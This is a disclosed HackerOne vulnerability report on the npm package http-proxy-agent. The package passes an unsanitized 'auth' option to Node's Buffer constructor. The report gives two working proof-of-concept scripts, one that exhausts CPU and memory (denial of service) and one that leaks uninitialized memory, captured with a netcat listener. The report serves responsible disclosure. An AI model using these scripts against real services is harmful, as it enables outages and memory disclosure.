# `http-proxy-agent` passes unsanitized options to Buffer(arg), resulting in DoS and uninitialized memory leak

## Report Details
- **Report ID**: 321631
- **URL**: https://hackerone.com/reports/321631
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-03-03T19:07:43.490Z
- **Disclosed**: 2018-04-05T21:51:46.634Z

## Reporter
- **Username**: chalker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a Buffer allocation vulnerability in `http-proxy-agent`.

In setups where auth argument is user-controlled, it allows to:

cause Denial of Service by trivially consuming all the available CPU resources
extract uninitialized memory chunks from the server on Node.js <8.x.
# Module

**module name:** `http-proxy-agent`
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/http-proxy-agent`

## Module Description

> This module provides an http.Agent implementation that connects to a specified HTTP or HTTPS proxy server, and can be used with the built-in http module.

## Module Stats

112 721 downloads in the last day
707 979 downloads in the last week
2 953 077 downloads in the last month

# Vulnerability

## Vulnerability Description

`http-proxy-agent` passes `auth` option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'auth' parameter (e.g. JSON).

The exact line: https://github.com/TooTallNate/node-http-proxy-agent/blob/master/index.js#L80

## Steps To Reproduce:

### DoS

```js
var url = require('url');
var http = require('http');
var HttpProxyAgent = require('http-proxy-agent');

var proxy = {
  protocol: 'http:',
  host: "127.0.0.1",
  port: 8080
};

setInterval(() => {
  proxy.auth = 1e9; // a number as 'auth'
  var opts = url.parse('http://example.com/');
  var agent = new HttpProxyAgent(proxy);
  opts.agent = agent;
  console.time('tick');
  http.get(opts);
  console.timeEnd('tick');
}, 200);
```

Observe how this is consuming memory and CPU — each request takes >1 second in the main thread on my setup.

### Uninitialized memory leak

```js
// listen with: nc -l -p 8080

var url = require('url');
var http = require('http');
var HttpProxyAgent = require('http-proxy-agent');

var proxy = {
  protocol: 'http:',
  host: "127.0.0.1",
  port: 8080
};

proxy.auth = 500; // a number as 'auth'
var opts = url.parse('http://example.com/');
var agent = new HttpProxyAgent(proxy);
opts.agent = agent;
http.get(opts);
```

Listen with `nl -l -p 8080` to see requests.

Execute on various Node.js versions — 4.x LTS, 6.x LTS, 8.x LTS / 9.x.

This leaks uninitialized Buffer memory on Node.js <8.x.
On ≥8.x those Buffers (that are using the deprecated API) are zero-filled.

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- OS: Arch Linux current
- Node.js 9.5.0
- npm 5.6.0
- gnu-netcat 0.7.1

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

# Note

Almost entirely similar to `https-proxy-agent`, but this is a separate package, a separate GitHub repo, different version numbers, different lines in code, different download stats.

## Impact

Denial of service
Sensitive data leak (on Node.js <8.0)

## Attachments
No attachments
